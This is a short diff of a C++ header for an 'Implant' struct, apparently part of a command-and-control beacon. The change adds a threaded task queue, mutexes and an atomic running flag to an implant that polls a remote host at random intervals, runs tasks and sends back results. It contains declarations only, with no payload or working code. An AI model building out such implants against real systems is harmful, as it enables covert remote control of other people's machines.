@@ -9,7 +9,11 @@
 #include <random>
 #include <string>
 #include <string_view>
-
+#include <future>
+#include <mutex>
+#include <vector>
+#include <atomic>
+#include "tasks.h"
 #include "results.h"
 
 struct Implant {
@@ -18,14 +22,17 @@ struct Implant {
   void serve();
   void set_mean_dwell(double mean_dwell);
   void set_running(bool is_running);
-
 private:
+  std::future<void> task_thread;
+  std::vector<Task> tasks;
+  std::mutex task_mutex, results_mutex;
   [[nodiscard]] std::string send_results();
   void parse_tasks(const std::string &response);
+  void service_tasks();
   boost::property_tree::ptree results;
   const std::string host, service;
   boost::asio::io_context &io_context;
-  bool is_running;
+  std::atomic_bool is_running;
   std::exponential_distribution<double> dwell_distribution_seconds;
   std::random_device device;
 };
